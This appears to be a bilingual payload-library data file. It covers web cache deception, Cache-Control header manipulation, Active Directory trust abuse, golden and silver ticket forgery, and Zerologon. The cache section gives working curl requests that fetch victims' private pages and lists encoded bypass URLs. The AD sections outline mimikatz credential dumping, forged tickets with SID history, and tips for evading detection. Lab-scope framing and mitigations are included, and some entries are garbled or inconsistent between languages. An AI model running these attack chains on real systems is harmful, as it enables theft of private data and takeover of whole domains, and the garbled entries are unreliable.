name.zh: Web 缓存欺骗

description.zh: 覆盖 Web 缓存欺骗的私有响应隔离验证：从路径缓存响应头探测与路径后缀伪装访问私有资源，到分隔符与编码变体绕过路径判定，并核验缓存响应是否含私有字段，用于确认私有响应可被他人命中。
description.en: Covers private-response isolation validation of web cache deception: from path cache-header probing and path-suffix disguise to fetch private resources through delimiter and encoding variants bypassing path judgment, verifying whether cached responses contain private fields, confirming private responses can be hit by others.

subCategory.zh: 缓存欺骗与私有内容泄露

prerequisites.zh: 确认 Web 缓存私有响应隔离验证 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for Web Cache Private-Response Isolation Validation are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

title.zh: 探测各路径缓存响应头
title.en: Probe cache response headers across paths

execution.command:
curl -sI "http://{TARGET}/" | grep -iE "x-cache|cf-cache|age:|via:|x-cdn|cache-control"
curl -sI "http://{TARGET}/test.css" | grep -iE "x-cache|age"
curl -sI "http://{TARGET}/test.js" | grep -iE "x-cache|age"
curl -sI "http://{TARGET}/test.jpg" | grep -iE "x-cache|age"
curl -sI "http://{TARGET}/account" | grep -iE "x-cache|age|cache-control"

description.zh: 对首页、css/js/jpg 静态资源及账号页逐一发送 HEAD 请求并提取 X-Cache、Age、Cache-Control 等头，识别哪些路径会被缓存。
description.en: Sends HEAD requests to the homepage, static css/js/jpg assets, and the account page, extracting X-Cache, Age, and Cache-Control headers to identify which paths are cached.

explanation.en: Describes how the value segment "X-Cache" participates in this validation command.

explanation.zh: 响应在缓存中存储的时间(秒)
explanation.en: Describes how the value segment "Age:" participates in this validation command.

explanation.zh: 显示中间代理/缓存服务器
explanation.en: Describes how the value segment "Via:" participates in this validation command.

title.zh: 路径后缀伪装访问私有资源
title.en: Access private resources with path-suffix disguise

execution.command:
curl -b "session={USER_SESSION}" "http://{TARGET}/account/profile.css"
curl "http://{TARGET}/account/profile.css"
curl "http://{TARGET}/account/x.js"
curl "http://{TARGET}/account/x.jpg"
curl "http://{TARGET}/account/x.png"
curl "http://{TARGET}/api/user/info/x.css"
curl "http://{TARGET}/settings/x.svg"

description.zh: 携带受害者会话请求 /account/profile.css 等静态后缀路径，再以匿名请求重复访问，比较缓存是否将私有响应存入静态资源键。
description.en: Requests suffix-disguised paths such as /account/profile.css with the victim session, then repeats them anonymously to see whether the cache stores private responses under static-resource keys.

explanation.zh: 后端解析为/account但缓存层认为是CSS文件
explanation.en: Describes how the value segment "/account/profile.css" participates in this validation command.

explanation.zh: 常见的缓存触发扩展名
explanation.en: Describes how the value segment ".css/.js/.jpg" participates in this validation command.

title.zh: 分隔符与编码变体绕过路径判定
title.en: Delimiter and encoding variants to bypass path classification

execution.command:
curl "http://{TARGET}/account;x.css"
curl "http://{TARGET}/account%23x.css"
curl "http://{TARGET}/account%3fx.css"
curl "http://{TARGET}/account?cb=123.css"
curl "http://{TARGET}/account/..%2fstatic/x.css"
# RPO (Relative Path Overwrite):
curl "http://{TARGET}/account/..%2f..%2fstatic/style.css"
curl "http://{TARGET}/account/./x.css"
curl "http://{TARGET}/account%2fx.css"

description.zh: 用分号参数、%23、%3f、%2f、点段等 URL 编码变体请求账号路径，测试缓存与源站对路径归一化和静态资源判定的分歧。
description.en: Requests the account path with semicolon parameters, %23, %3f, %2f, dot-segment, and other encoded variants to expose disagreements between cache and origin on path normalization and static-asset classification.

explanation.zh: 分号在某些框架中是路径参数分隔符
explanation.en: Describes how the value segment ";x.css" participates in this validation command.
# URL Encoding, not Same Componentprocessing not Same

explanation.zh: ../的URL编码，可能绕过缓存层的路径匹配
explanation.en: Describes how the value segment "..%2f" participates in this validation command.

title.zh: 验证缓存响应是否含私有字段
title.en: Verify cached responses for private fields

description.zh: 携带有效会话请求账号页并大小写不敏感地提取 email、phone、address、token 字段，再请求头像静态资源并检查 X-Cache，确认私有响应是否被缓存共享。
description.en: Requests the account page with a valid session while case-insensitively extracting email, phone, address, and token fields, then fetches the avatar asset and checks X-Cache to confirm whether private responses are shared through the cache.

explanation.zh: 确认响应来自缓存而非源站
explanation.en: Describes how the value segment "X-Cache: HIT" participates in this validation command.

analysis.zh: Web 缓存私有响应隔离验证只有在唯一标记输入、服务端最终解析结果、服务端日志与可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: Web Cache Private-Response Isolation Validation is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。
opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

title.zh: URL 编码变体缓存键混淆清单

wafBypass.command:
https://{TARGET}/account/settings;.css
https://{TARGET}/account/settings%0a.css
https://{TARGET}/account/settings%23.css
https://{TARGET}/account/settings%3f.css
https://{TARGET}/account/settings%2f.css
https://{TARGET}/account/settings%5c.css

description.zh: 枚举分号、换行、#、?、/、反斜杠等编码变体构造的设置页 URL，用于测试缓存键与源站路由对这些字符的解析差异。
description.en: Lists settings-page URLs built with encoded semicolon, newline, #, ?, /, and backslash variants to test how cache keys and origin routing disagree on these characters.

syntaxBreakdown.part: # 利用缓存服务器对路径分隔符的差异解析

title.zh: 相对路径覆盖与原始 URL 头样例

wafBypass.command:
# Relative Path Overwrite
https://{TARGET}/account/settings/..%2f..%2fstatic/style.css
https://{TARGET}/account/settings/nonexistent.css
https://{TARGET}/account/settings;param=value/test.css
https://{TARGET}/account/settings/test.js?_=1
https://{TARGET}/account/settings HTTP/1.1
X-Original-URL: /static/style.css

description.zh: 以 ..%2f 相对路径覆盖、虚构静态文件、分号参数和 X-Original-URL 头等样例，测试缓存对静态资源判定与真实路由的错位。
description.en: Uses ..%2f relative-path overwrite, fictitious static files, semicolon parameters, and an X-Original-URL header to test cache misalignment between static-asset classification and real routing.

title.zh: 扩展名与归一化变体探测清单
title.en: Extension and normalization variant probe list

wafBypass.command:
https://{TARGET}/account/settings/.css
https://{TARGET}/account/settings/test.avif
https://{TARGET}/account/settings/x.woff2
https://{TARGET}//account//settings.css
https://{TARGET}/account/settings%252f.css
curl -H "Accept: text/css" https://{TARGET}/account/settings

description.zh: 枚举 .css/.avif/.woff2 后缀、双斜杠、双重编码 %252f 及 Accept: text/css 等变体，观察缓存对动态路径的静态化误判。
description.en: Enumerates .css/.avif/.woff2 suffixes, double slashes, double-encoded %252f, and Accept: text/css variants to observe cache misclassification of dynamic paths as static.

description.zh: 绕过 CDN 按单后缀判定静态的规则：双扩展叠加改变后缀解析。成功判据：私有响应被缓存返回。
description.en: Bypasses CDN static-file rules keyed on a single suffix by stacking extensions to shift suffix parsing. Success: the private response is cached and served.

description.zh: 编码的点号与扩展名绕过字面后缀匹配。成功判据：缓存层仍按静态处理。
description.en: Encoded dots and extensions bypass literal suffix matching. Success: the cache layer still treats the path as static.

description.zh: 查询串/分号/片段后缀改变键形态但保持静态判定。成功判据：私有内容进入缓存。
description.en: Query/semicolon/fragment suffixes reshape the key while preserving static classification. Success: private content enters the cache.

description.zh: 以认证会话请求静态后缀路径，再匿名重复请求；匿名请求取回私有内容，即确认缓存欺骗。
description.en: Request the static-suffixed paths with an authenticated session, then repeat anonymously; anonymous retrieval of private content confirms web cache deception.

description.zh: 对首页、css/js/jpg 静态资源与账号页逐一提取 X-Cache、Age、Cache-Control 头；静态后缀命中缓存而账号页不缓存，即摸清 CDN 的静态资源判定规则。
description.en: Collect X-Cache, Age and Cache-Control headers for the homepage, static assets and the account page; learning which suffixes the CDN treats as cacheable defines the disguise rule to abuse.

attackChain.payload:
curl -sI "http://{TARGET}/" | grep -iE "x-cache|cf-cache|age:|via:|x-cdn|cache-control"
curl -sI "http://{TARGET}/test.css" | grep -iE "x-cache|age"
curl -sI "http://{TARGET}/test.js" | grep -iE "x-cache|age"
curl -sI "http://{TARGET}/test.jpg" | grep -iE "x-cache|age"
curl -sI "http://{TARGET}/account" | grep -iE "x-cache|age|cache-control"

title.zh: 伪装静态后缀套取私有页面
title.en: Fetch private pages via static-suffix disguise

description.zh: 携带受害者会话请求 /account/profile.css，源站返回账号数据而缓存按静态键存储；随后匿名请求同 URL 拿到账号内容即完成缓存欺骗，私密数据进入共享缓存。
description.en: Request /account/profile.css with the victim session so the origin returns account data under a static cache key; an anonymous request to the same URL returning the data completes the deception.

attackChain.payload:
curl -b "session={USER_SESSION}" "http://{TARGET}/account/profile.css"
curl "http://{TARGET}/account/profile.css"
curl "http://{TARGET}/account/x.js"
curl "http://{TARGET}/account/x.jpg"
curl "http://{TARGET}/account/x.png"
curl "http://{TARGET}/api/user/info/x.css"
curl "http://{TARGET}/settings/x.svg"

title.zh: 编码变体绕过路径判定
title.en: Bypass path classification with encoded variants

description.zh: 用分号参数、%23、%3f、点段等 URL 编码变体重访账号路径，制造缓存与源站的路径归一化分歧；任一变体匿名可复取私有数据即绕过静态判定规则。
description.en: Revisit the account path with semicolon parameters, %23, %3f and dot-segment variants to split cache and origin path normalization; any variant that anonymously re-serves private data bypasses the rule.

attackChain.payload:
curl "http://{TARGET}/account;x.css"
curl "http://{TARGET}/account%23x.css"
curl "http://{TARGET}/account%3fx.css"
curl "http://{TARGET}/account?cb=123.css"
curl "http://{TARGET}/account/..%2fstatic/x.css"
# RPO (Relative Path Overwrite):
curl "http://{TARGET}/account/..%2f..%2fstatic/style.css"
curl "http://{TARGET}/account/./x.css"
curl "http://{TARGET}/account%2fx.css"

title.zh: 提取缓存中的敏感字段
title.en: Harvest sensitive fields from the cache

description.zh: 从被缓存的账号响应中提取 email、phone、address、token 字段并核对头像资源的 X-Cache 状态；敏感字段可被匿名读取即量化越权范围，完成数据收割。
description.en: Extract email, phone, address and token fields from the cached account response and check X-Cache on avatar resources; anonymously readable sensitive fields quantify the account takeover scope.

overview.zh: 该 Payload 覆盖 Web 缓存欺骗的私有响应隔离场景，检验静态后缀路径能否让含用户数据的动态响应进入共享缓存并被匿名命中。验证维度含缓存头探测、路径后缀伪装、分隔符编码变体与私有字段核验，对应第 1 至第 4 步。
overview.en: This payload covers web cache deception and private-response isolation, testing whether static-suffix paths push dynamic responses containing user data into a shared cache that anonymous users can hit. Validation covers cache-header probing, path-suffix disguise, delimiter and encoding variants, and private-field verification, mapped to steps 1 through 4.

vulnerability.zh: 根因在于缓存层与源站对路径的静态资源判定不一致：带 .css、.js 后缀或编码分隔符的账号路径被当作可缓存对象，携带会话的响应因此存储进公共键。
vulnerability.en: The root cause is cache-to-origin divergence on static-resource path classification: account paths with .css or .js suffixes or encoded delimiters are treated as cacheable objects, so session-carrying responses land under public keys.

exploitation.zh: 第 1 步对首页与静态路径发 HEAD 并提取 X-Cache、Age、Cache-Control，确认哪些路径会进缓存；第 2 步携带会话请求 account 加静态后缀，再匿名重复访问，取回私有内容即确认欺骗成立；第 3 步用分号与编码变体测试路径判定分歧；第 4 步在缓存响应中检索 email 等私有字段留证。占位符在全局变量菜单替换；变体参考 wafBypass。
exploitation.en: In step 1, HEAD the home and static paths extracting X-Cache, Age and Cache-Control to learn what gets cached. In step 2, request the account path with a static suffix carrying the session, then anonymously; retrieving private content confirms the deception. In step 3, probe path-classification divergence with semicolon and encoding variants. In step 4, search cached responses for private fields like email as evidence. Replace placeholders via the global variables menu; see wafBypass for variants.

mitigation.zh: 按 Content-Type 与认证状态决定缓存资格，认证响应一律 no-store 或私有化；规范路径解析避免后缀伪装。修复后重放第 2、4 步，匿名请求应取不到私有内容。
mitigation.en: Decide cacheability by Content-Type and authentication state, marking authenticated responses no-store or private; normalize path parsing to defeat suffix disguise. After the fix, replay steps 2 and 4: anonymous requests should retrieve no private content.

name.zh: Cache-Control 请求指令操纵

description.zh: 使用冲突、极大寿命和非标准 Cache-Control 组合检查 CDN 与源站是否错误改变共享缓存行为。
description.en: Uses conflicting, extreme-lifetime, and nonstandard Cache-Control combinations to test incorrect shared-cache behavior across CDN and origin.

subCategory.zh: 缓存键与未键入头投毒

prerequisites.zh: 在 CDN 测试区使用唯一 key、短时效 canary 和两个客户端，记录源站响应 Cache-Control 与各层实际 TTL。
prerequisites.en: Use a unique key, short-lived canary, and two clients in a CDN test zone, recording origin response Cache-Control and effective TTL at each tier.

prerequisites.zh: 区分请求可用与仅响应可用 directive，逐项测试冲突/极值组合，并采集 Age、生成 ID、HIT/MISS 和失效事件。
prerequisites.en: Distinguish request-applicable from response-only directives, test conflict and extreme combinations individually, and collect Age, generation ID, HIT or MISS, and invalidation events.

CDN-Cache-Control: max-age=999999
Cloudflare-CDN-Cache-Control: max-age=999999

description.zh: 把缓存指令逐条置于请求并核对响应缓存行为；指令被接受并延长共享缓存寿命，即确认缓存资格差异。
description.en: Place each cache directive into requests and compare caching behavior; directives accepted with extended shared-cache lifetime confirm cache-eligibility differences.

analysis.zh: 阳性要求客户端请求 directive 非预期改变共享缓存资格或寿命，使本应不共享/已更新的 canary 被另一客户端持续命中，且源站未重新生成。Header 被接受、Age 存在、浏览器本地缓存、公共资源 HIT、请求 no-cache 触发回源、响应 directive 优先或只改变性能都不是缓存安全缺陷。
analysis.en: Positive evidence requires a client request directive to unexpectedly change shared-cache eligibility or lifetime so another client continues hitting a canary that should be private or updated, without origin regeneration. Header acceptance, an Age value, browser-local cache, HIT on public assets, request no-cache causing revalidation, response directives taking precedence, or performance-only changes is not a cache-security flaw.

opsecTips.zh: 确认一个错误共享或过期的 canary 后即停止，不在实验中保留达到语料极值量级的真实缓存时长。
opsecTips.en: Stop after confirming one incorrectly shared or stale canary; do not apply the corpus's extreme lifetime to real cache entries.

opsecTips.zh: Purge 唯一 key，删除 canary 与客户端缓存，清除 CDN trace，并恢复仅信任响应策略和 TTL 上限。
opsecTips.en: Purge the unique key, delete the canary and client caches, clear CDN traces, and restore response-policy authority and TTL caps.

description.zh: 多指令与重复头叠加命中不同的解析归并策略。成功判据：响应缓存行为发生跳变。
description.en: Stacked directives and duplicate headers hit different merge strategies. Success: cache behavior jumps.

description.zh: 编码连字符、伪参数与引号包裹绕过指令白名单。成功判据：指令仍被解释为标准语义。
description.en: Encoded hyphens, pseudo-params, and quoting bypass directive allowlists. Success: the directive is still interpreted with standard semantics.

title.zh: 建立缓存资格与寿命差异基线
title.en: Establish the Cache Eligibility and Lifetime Differential baseline

description.zh: 记录无 Cache-Control 请求时的响应缓存策略、Age、ETag 和重新验证行为，并保存原始请求、响应与服务端关联标识。
description.en: Record response cache policy, Age, ETag, and revalidation behavior without a Cache-Control request header, retaining raw requests, responses, and server correlation identifiers.

title.zh: 执行缓存资格与寿命差异变体
title.en: Execute the Cache Eligibility and Lifetime Differential variants

description.zh: 逐项发送原始 Cache-Control 组合到测试资源，并在每次前使用唯一缓存键，严格保持其他变量不变并设置停止阈值。
description.en: Send original Cache-Control combinations one at a time to a test resource with a unique cache key for each run, holding all other variables constant and defining a stop threshold.

title.zh: 核验Cache-Control 请求指令操纵证据
title.en: Verify evidence for Cache-Control Request-Directive Manipulation

description.zh: 确认请求指令改变共享缓存的存储、寿命或验证决策，并由第二客户端复现；同时排除响应头回显请求值、浏览器私有缓存变化或 Age 不代表共享内容。
description.en: Confirm that a request directive changes shared-cache storage, lifetime, or validation decisions and is reproduced by a second client; also exclude Response reflection of request values, private browser-cache changes, or Age unrelated to shared content.

overview.zh: 该 Payload 覆盖请求侧 Cache-Control 指令操纵场景，检验冲突与超长寿命指令改变共享缓存行为的暴露面。验证维度为禁用、延长与标准组合的指令矩阵，对应第 1 步。
overview.en: This payload covers request-side Cache-Control directive manipulation, testing exposure where conflicting and over-long-lifetime directives shift shared-cache behavior. Validation is a directive matrix of disabling, extending and standard combos, mapped to step 1.

vulnerability.zh: 根因在于源站或缓存把请求头指令当作响应侧策略使用：攻击者指令延长共享寿命或改变资格判定，私有或过期内容随之进入共享缓存层。
vulnerability.en: The root cause is origins or caches applying request-header directives as response-side policy: attacker directives extend shared lifetimes or flip eligibility, pulling private or stale content into the shared layer as a result.

exploitation.zh: 第 1 步按脚本把缓存指令变体逐条置于请求并核对响应缓存头与后续命中行为：指令被接受且寿命被延长或资格被改变即确认差异，对认证页复测以评估私有内容暴露。成功判据以缓存行为变化为准。占位符在全局变量菜单替换。
exploitation.en: In step 1, place cache-directive variants into requests one by one per the script, checking response cache headers and subsequent hits; accepted directives extending lifetimes or flipping eligibility confirm the divergence, retested on authenticated pages to gauge private-content exposure. Judge success by cache-behavior changes. Replace placeholders via the global variables menu.

mitigation.zh: 忽略请求侧缓存指令并以源站响应头为唯一依据，认证内容强制 no-store。修复后重放第 1 步矩阵，全部指令应不影响共享缓存行为。
mitigation.en: Ignore request-side cache directives, honoring origin response headers alone, and force no-store on authenticated content. After the fix, replay the step 1 matrix: no directive should shift shared-cache behavior.

name.zh: AD 跨域信任配置审计

description.zh: 枚举域与林信任的方向、传递性与 TGT 转发能力，验证跨信任边界的防护强度。
description.en: AD Cross-Domain Trust Configuration Audit preserves the original reproducible technique commands while restricting execution to a written, reversible, isolated lab authorization. Only obvious placeholders, narrative-only lines, and non-executable fragments are repaired, with identity, host, directory, network, and security-product evidence required.

title.zh: AD 跨域信任配置审计校正命令 4
title.en: AD Cross-Domain Trust Configuration Audit Reviewed Command 4

description.zh: 在隔离授权环境运行并关联 PAYLOADER_DOMAIN_DOMAIN_CROSS_TRUST_E_4 与蓝队日志；成功时列出目标域的组清单。
description.en: Run in the isolated authorization and correlate PAYLOADER_DOMAIN_DOMAIN_CROSS_TRUST_E_4 with blue-team logs; a group listing for the target domain confirms success.

title.zh: AD 跨域信任配置审计校正命令 5
title.en: AD Cross-Domain Trust Configuration Audit Reviewed Command 5

description.zh: 在隔离授权环境运行并关联 PAYLOADER_DOMAIN_DOMAIN_CROSS_TRUST_E_5 与蓝队日志；成功时跨域黄金票据注入成功，klist 显示包含 519 SID history 的票据。
description.en: Run in the isolated authorization and correlate PAYLOADER_DOMAIN_DOMAIN_CROSS_TRUST_E_5 with blue-team logs; the cross-domain golden ticket injecting with klist showing a ticket carrying SID history 519 confirms success.

title.zh: AD 跨域信任配置审计校正命令 6
title.en: AD Cross-Domain Trust Configuration Audit Reviewed Command 6

description.zh: 在隔离授权环境运行并关联 PAYLOADER_DOMAIN_DOMAIN_CROSS_TRUST_E_6 与蓝队日志；成功时 asktgt 获取 TGT 并写入票据缓存，klist 可见。
description.en: Run in the isolated authorization and correlate PAYLOADER_DOMAIN_DOMAIN_CROSS_TRUST_E_6 with blue-team logs; asktgt obtaining a TGT written to the cache and visible in klist confirms success.

analysis.zh: AD 跨域信任配置审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: AD Cross-Domain Trust Configuration Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 一次只查询一个实验对象并限制结果数量，不保存凭据、哈希、票据、邮箱正文或无关个人数据。
opsecTips.en: Query one lab object at a time with bounded results and do not retain credentials, hashes, tickets, mailbox content, or unrelated personal data.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

description.zh: 规避 PowerView/DSInternals 模块特征：系统自带 nltest 枚举全部信任；输出信任域清单即成功。
description.en: Enumerate trusts with the built-in nltest instead of PowerView modules; a trust list output confirms success.

description.zh: 规避对 PowerShell 域枚举的监控：直接 LDAP 查询信任对象属性；返回 trustPartner 即成功。
description.en: Query trust objects directly over LDAP to bypass PowerShell domain-enumeration monitoring; returned trustPartner values confirm success.

title.zh: AD 模块 Get-ADTrust 变体

description.zh: 以官方管理模块替代攻击框架特征：RSAT ActiveDirectory 模块属于运维常态流量；输出信任矩阵即成功。
description.en: Use the RSAT ActiveDirectory module, blending with routine admin traffic; an output trust matrix confirms success.

description.zh: 运行 Get-NetDomainTrust 列出信任方向与类型；存在 INBOUND 或双向信任的目标域即跨域攻击候选。
description.en: Run Get-NetDomainTrust to list trust direction and type; INBOUND or bidirectional trusts mark candidate target domains.

title.zh: 摸清林内信任与目标域人员
title.en: Chart forest trusts and target accounts

description.zh: 用 Get-NetForestTrust 扩到林级，再以 Get-NetUser 与 Get-NetGroup 枚举目标域账号与高价值组；锁定管理员清单即完成跨域情报储备。
description.en: Expand with Get-NetForestTrust, then enumerate target-domain users and groups with Get-NetUser/Get-NetGroup; locking the admin list completes cross-domain intelligence.

description.zh: 用源域 krbtgt 哈希构造携带目标域企业管理员组 SID（目标域 SID 加 RID 519，即 /sids 参数）的黄金票据并注入；klist 出现新票据并能以管理员身份访问目标域资源即跨域身份伪造完成。
description.en: Build a golden ticket with the source krbtgt hash carrying the target S-519 SID and inject it; the ticket visible in klist completes the cross-domain admin forgery.

title.zh: 请求目标域票据完成接管
title.en: Request target-domain tickets to finish takeover

description.zh: 用 Rubeus asktgt（或 Kekeo tgt::ask）以哈希直接请求目标域 TGT；获得可用票据后访问目标域服务即完成跨域控制闭环。
description.en: Request a target-domain TGT directly with asktgt.exe using the hash; a usable ticket accessing target services closes the cross-domain takeover.

overview.zh: AD 跨域信任配置审计覆盖跨域信任滥用场景：针对存在域间或森林间信任的实验环境，验证信任方向与 SID 过滤配置能否被用于跨域越权。验证维度涵盖域信任与森林信任枚举、跨域用户组清点、SID History 黄金票据伪造与 TGT 申请六类步骤。
overview.en: AD Cross-Domain Trust Configuration Audit covers cross-domain trust abuse: in lab environments with inter-domain or forest trusts, verify whether trust direction and SID filtering configurations enable cross-domain escalation. Verification dimensions cover domain and forest trust enumeration, cross-domain user/group inventory, SID History golden ticket forgery, and TGT requests — six steps.

vulnerability.zh: 根因是外部信任未启用 SID 过滤或选择性认证：攻击者持有源域 krbtgt 哈希即可伪造携带目标域高危组 SID History 的票据跨域通行；双向信任叠加缺失过滤时，单个域沦陷会沿信任链放大为森林级影响。
vulnerability.en: The root cause is external trusts without SID filtering or selective authentication: holding the source domain's krbtgt hash lets an attacker forge tickets carrying target-domain high-privilege SID History entries; bidirectional trusts without filtering amplify a single domain compromise into forest-level impact along the trust chain.

exploitation.zh: 按 Payload 列表顺序使用：第 1、2 步用 Get-NetDomainTrust 与 Get-NetForestTrust 枚举信任方向与 trust attributes，确认双向信任且未启用 SID 过滤即发现缺口；第 3、4 步清点目标域用户与组，锁定高价值目标；第 5 步用 mimikatz kerberos::golden 伪造带目标域 519 SID History 的跨域黄金票据并 /ptt 注入，klist 可见即确认成功；第 6 步用 asktgt 申请目标域 TGT 补充验证可达性。LAB_* 占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: steps 1 and 2 enumerate trust direction and trust attributes with Get-NetDomainTrust and Get-NetForestTrust — bidirectional trusts without SID filtering reveal the gap; steps 3 and 4 inventory target-domain users and groups to lock high-value targets; step 5 forges a cross-domain golden ticket carrying the target domain's 519 SID History with mimikatz kerberos::golden and injects it via /ptt — visible in klist confirms success; step 6 requests a target-domain TGT with asktgt to confirm reachability. Replace LAB_* placeholders via the global variables menu.

mitigation.zh: 对外部信任启用 SID 过滤与选择性认证，按两阶段流程轮换全部域的 krbtgt 密码（首次随机重置，间隔超过票据寿命后再次重置），监控携带 SID History 的票据请求与跨域异常 TGT。修复后用第 5 步样例回归，带 SID History 的票据应被目标域 KDC 拒绝。
mitigation.en: Enable SID filtering and selective authentication on external trusts, rotate all domains' krbtgt passwords periodically (twice, per registry policy), and monitor ticket requests carrying SID History plus anomalous cross-domain TGTs. After the fix, regress with the step 5 sample: tickets with SID History must be rejected by the target domain's KDC.

description.zh: 用 klist 查看注入票据，随后直接访问任意域内主机的共享资源；各主机均可成功登录即获得全域管理员级控制权。
description.en: Check klist, then access shares on arbitrary domain hosts; logging in everywhere proves domain-admin level control.

overview.zh: 黄金票据前置条件与检测审计覆盖 krbtgt 凭据滥用场景：针对已获取域 krbtgt NTLM 哈希的测试主体，验证能否伪造任意身份的 TGT 并通过 KDC 校验。验证维度涵盖 krbtgt 哈希提取、身份基线记录、黄金票据伪造注入与票据核验四步流程。
overview.en: Golden-Ticket Preconditions and Detection Audit covers krbtgt credential abuse: for a test principal holding the domain krbtgt NTLM hash, verify whether arbitrary TGTs can be forged and accepted by the KDC. Verification dimensions unfold across four steps: krbtgt hash extraction, identity baseline recording, golden ticket forging and injection, and ticket verification.

vulnerability.zh: 根因是 krbtgt 账户哈希是域内全部 TGT 的加密密钥，持有该哈希即可为任意用户伪造含任意组 SID 的 TGT，KDC 无法区分伪造与真实票据；krbtgt 密码长期不轮换时，该伪造能力在密码修改前无限期有效。
vulnerability.en: The root cause is that the krbtgt account hash is the signing key for every TGT in the domain, so holding it permits forging TGTs for any user with arbitrary group SIDs that the KDC cannot distinguish from genuine tickets; while the krbtgt password is never rotated, the forgery capability persists indefinitely.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步用 mimikatz lsadump::lsa /inject 提取 krbtgt 的 NTLM 哈希与域 SID；第 2 步用 whoami /user 记录当前身份基线以便对比；第 3 步用 kerberos::golden 填入第 1 步取得的 SID 与哈希伪造 Administrator 黄金票据并 /ptt 注入；第 4 步用 klist 确认域管理员票据生效且可访问任意服务，即确认伪造链路成功。LAB_* 占位符在全局变量菜单中替换为目标值。
exploitation.en: Use in Payload list order: step 1 extracts the krbtgt NTLM hash and domain SID with mimikatz lsadump::lsa /inject; step 2 records the current identity baseline with whoami /user for comparison; step 3 forges an Administrator golden ticket with kerberos::golden using the SID and hash from step 1 and injects it via /ptt; step 4 verifies with klist that the domain-admin ticket is active and grants arbitrary service access, confirming the forgery chain. Replace LAB_* placeholders via the global variables menu.

mitigation.zh: 按两阶段流程轮换 krbtgt 密码（首次随机重置，间隔超过票据寿命后再次重置），监控 4768/4769 中票据寿命或签名异常的请求；域控遭受入侵后必须完成该轮换。修复后旧哈希伪造的票据应被 KDC 拒绝。
mitigation.en: Rotate the krbtgt password in two passes (first reset to a random value, second after the ticket lifetime), and monitor 4768/4769 requests with abnormal lifetimes or signatures; the rotation is mandatory after any DC compromise. After the fix, tickets forged with the old hash must be rejected by the KDC.

overview.zh: 白银票据前置条件与检测审计覆盖服务票据伪造场景：针对已获取目标服务账号 NTLM 哈希的测试主体，验证能否为特定 SPN 伪造服务票据并绕过 KDC。验证维度涵盖内存凭据提取、CIFS 服务票据伪造注入与服务类型映射扩展三个步骤。
overview.en: Silver-Ticket Preconditions and Detection Audit covers service-ticket forgery: for a test principal holding the target service account's NTLM hash, verify whether tickets for specific SPNs can be forged while bypassing the KDC. Verification dimensions span in-memory credential extraction, CIFS ticket forgery and injection, and service-type mapping expansion.

vulnerability.zh: 根因是服务票据由服务账号自身密码加密，KDC 不参与签发后的校验；拿到服务账号（含机器账户）NTLM 哈希的攻击者可伪造任意用户身份的服务票据，服务端缺少 PAC 签名校验时该票据直接生效。
vulnerability.en: The root cause is that service tickets are encrypted with the service account's own password and the KDC plays no role in post-issuance validation; an attacker holding the NTLM hash of a service account (including machine accounts) can forge service tickets as any user, and without server-side PAC signature checks such tickets take effect directly.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步用 sekurlsa::logonpasswords 提取内存凭据，获得目标服务账号 NTLM 哈希；第 2 步用 kerberos::golden 指定 /target 目标主机、/service:cifs 与该哈希伪造服务票据并 /ptt 注入，klist 显示 cifs 票据且可访问目标共享即确认成功；第 3 步按 CIFS/HTTP/LDAP/MSSQLSvc/HOST 映射扩展到其他服务类型，对每个 SPN 复用同一方法。LAB_* 占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 extracts in-memory credentials with sekurlsa::logonpasswords to obtain the target service account's NTLM hash; step 2 forges a service ticket with kerberos::golden specifying /target, /service:cifs, and that hash, injects via /ptt — klist showing the cifs ticket plus target share access confirms success; step 3 extends to other service types via the CIFS/HTTP/LDAP/MSSQLSvc/HOST mapping, reusing the same method per SPN. Replace LAB_* placeholders via the global variables menu.

mitigation.zh: 定期轮换服务账号与机器账户密码使伪造密钥失效，为敏感服务启用 PAC 签名校验；在服务端关联比对登录事件与 KDC 侧 4769 票据签发记录，无法配对的登录即为白银票据信号。修复后伪造票据应被服务端 PAC 校验拒绝。
mitigation.en: Rotate service account and machine account passwords regularly to invalidate forgery keys, and enable PAC signature validation for sensitive services; monitor service-ticket requests with no matching TGT session (missing 4768/4769 pairing at the KDC). After the fix, forged tickets must fail server-side PAC validation.

overview.zh: Zerologon 补丁与协议配置审计覆盖 Netlogon 特权提升场景：针对未安装 2020-08 补丁且未开启强制模式的域控，验证 CVE-2020-1472 加密缺陷是否可被利用。验证维度涵盖漏洞探测、机器账户密码置空、空凭据哈希导出与密码恢复四步闭环。
overview.en: Zerologon Patch and Protocol Configuration Audit covers Netlogon privilege escalation: for DCs without the 2020-08 patch or enforcement mode, verify whether the CVE-2020-1472 cryptographic flaw is exploitable. Verification dimensions form a four-step loop: vulnerability probing, machine-account password nulling, hash export with empty credentials, and password restoration.

